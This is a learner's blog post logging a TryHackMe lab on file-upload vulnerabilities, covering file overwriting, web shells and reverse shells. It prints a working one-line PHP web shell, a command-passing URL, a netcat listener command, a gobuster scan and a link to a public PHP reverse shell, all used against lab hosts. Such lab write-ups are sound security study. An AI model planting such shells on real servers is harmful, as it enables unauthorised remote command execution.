---
title: Day 23
date: 2022-05-06
layout: post.njk
---

{{ page.date.toDateString }}
Today I'm wokring on the [Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns) module. I think really understanding how to take advantage of file upload vulnerabilities could be a huge help in finding bug bounties.

Theres a few different things you can do with file upload vulnerabilites:
- Overwriting existing files on a server
- Uploading and Executing Shells on a server
- Bypassing Client-Side filtering
- Bypassing various kinds of Server-Side filtering
- Fooling content type validation checks

## Overwriting Existing Files
The first exercise is overwriting a file. The first site has a file upload with a picture for the background. I looked at the source for the image and it was `images/mountains.jpg` so I copied a local image to have the same name `mountains.jpg` and uploaded it and got the flag.

## Remote Code Execution
The second exercise was taking advantage of an RCE. The two main options:
- Web shells
- Reverse Shells

### Web Shell
A webshell would be uploading a file with code that is the same as the backend. Then referencing it and using the ulr to pass commands. For example I use gobuster to do some directory enumeration. I see that there is a upload directory and I make the assumption that files are uploaded there. I assume the backend is running PHP.  so I upload `webshell.php` which is just:

>`<?php`
>
>    `echo system($_GET["cmd"]);`
>
>`?>`

the I use the url `/uploads/webshell.php?cmd=id;whoami;ls` and view the page and I'll see the result of those commands being run. From here we can do anything including upgrading to a reverse shell.

### Reverse Shell
Is when you have an interactive shell in a terminal. The process for doing this is essentially the same as the webshell you take a file like [Pentest Monkey reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) that matches the backend code being used by the application and input your IP. You open a netcat listener on the correct port using `nc -lvnp 1234`. You upload the file, then navigate to the file in your browser. This time the browser will hang but if you look back at the terminal you should have a connection.

### Practical
In this exercise I start by running gobuster to enumerate the directories using `gobuster dir -u http://shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

I got the results:
>`/resources`
>
>`/assets`
>
>`/server-status`

I attempted to upload to `/resources` I did both the web shell upload and the reverse shell uploads successfully. 

This seemed like a good palce to stop today so I'll pick up the rest of this tomorrow.

